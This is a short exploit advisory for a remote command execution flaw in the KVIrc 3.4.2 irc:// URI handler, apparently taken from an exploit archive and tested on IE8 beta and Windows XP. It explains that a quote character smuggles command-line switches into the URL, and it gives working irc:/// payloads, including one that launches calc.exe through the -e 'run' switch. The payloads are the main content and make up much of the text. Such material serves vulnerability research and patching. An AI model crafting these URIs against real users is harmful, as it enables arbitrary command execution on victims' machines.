KVIrc 3.4.2 Shiny (uri handler) remote command execution exploit
by Nine:Situations:Group::strawdog
Tested against IE8beta/WINxpsp3

OS.[..]"

A command line parsing vulnerability exists (or I should say persists...:
http://secunia.com/advisories/25740, fixed or not?) which can be exploited by
passing the '"' char followed by command line switches to 'irc:///', 'irc6:///',
'ircs:///' and 'ircs6:///' urls, ex. this shows the argument list:
irc:///"%20--help%20"
The most interesting one is the -e switch followed by 'run' command, this runs
calc.exe:
irc:///"%20--nosplash%20-e%20"run%20calc"%20"
